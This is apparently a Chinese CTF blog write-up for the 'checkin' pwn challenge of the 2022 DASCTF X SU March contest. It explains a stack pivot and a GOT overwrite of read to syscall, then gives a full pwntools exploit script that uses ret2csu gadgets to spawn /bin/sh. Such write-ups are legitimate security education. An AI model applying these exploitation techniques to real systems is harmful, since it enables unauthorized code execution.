---
layout: article
pageview: true
key: 2022-03-28-buu-March-pwn-wp
title: 2022DASCTF X SU 三月春季挑战赛 Pwn题WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

# 2022DASCTF X SU 三月春季挑战赛 Pwn题WP

<!--more-->

## checkin

题目环境2.31，保护只有NX，题目内可利用函数只有`read`和`setvbuf`，main函数中溢出到ret便结束了。

调用`read`函数的代码通过`rbp+buf`的形式算出`rsi`,我们可以通过溢出控制`rbp`并再次调用`read`函数来在指定地址写入内容，之后栈迁移便可控制程序流执行`execve("/bin/sh",0,0`。

我们通过修改`read`函数的got表，使其指向`syscall`,再通过`syscall`调用`execve`即可。

2.31的libc中，修改`read`地址为`syscall`需要爆破半字节。



```python
from pwn import *
context(arch='amd64', log_level='debug')
flag = 0
ps = './checkin'
libc = ELF("./libc.so.6")
elf = ELF(ps)


def getConn():
    global flag
    if(flag == 1):
        return remote(host, port)
    return process(ps)


def debug(conn, arg=None):
    global flag
    if(flag == 1):
        return
    gdb.attach(conn, arg)
    pause()


def csu(call, rdi, rsi, rdx):
    csu_end = 0x40124A
    csu_front = 0x401230
    payload = p64(csu_end)+p64(0)+p64(1)+p64(rdi)+p64(rsi) + \
        p64(rdx)+p64(call)+p64(csu_front)+b'\x00'*0x38
    return payload


leave_ret = 0x00000000004011e2
p_rsi_15 = 0x0000000000401251
p_rdi = 0x0000000000401253
addr = elf.bss()+0x500
p = getConn()


p.send(b'a'*0xa0+p64(addr+160)+p64(0x4011bf))
sleep(0.1)

log.info(hex(addr+160))

pay = csu(elf.got['read'], 0, elf.got['read'], 2) + \
    p64(0x401156)

pay = pay.ljust(0xa0, b'\x00')
pay += p64(addr-8)+p64(leave_ret)
p.send(pay)


sleep(0.1)

p.send('\x00\xb0')

sleep(0.1)

addr += 0x100

p.send(b'a'*0xa0+p64(addr+160)+p64(0x4011bf))
sleep(0.1)

binsh = addr-0x100

pay = csu(elf.got['read'], 0, binsh, 8)+p64(0x401156)
p.send(pay.ljust(0xa0, b'\0')+p64(addr-8)+p64(leave_ret))
sleep(0.1)

p.send('/bin/sh\x00')

sleep(0.1)
addr += 0x100

# debug(p)

p.send(b'a'*0xa0+p64(addr+160)+p64(0x4011bf))
sleep(0.1)

pay = p64(0x40124a)+p64(0)+p64(1)+p64(0)+p64(addr+0x100)+p64(59)+p64(elf.got['read'])+p64(
    0x401230)+p64(0)*3+p64(binsh)+p64(0)*2+p64(elf.got['read'])+p64(0x401230)

p.send(pay.ljust(0xa0, b'\0')+p64(addr-8)+p64(leave_ret))

sleep(0.1)
p.send('\x00'*59)


p.interactive()

```
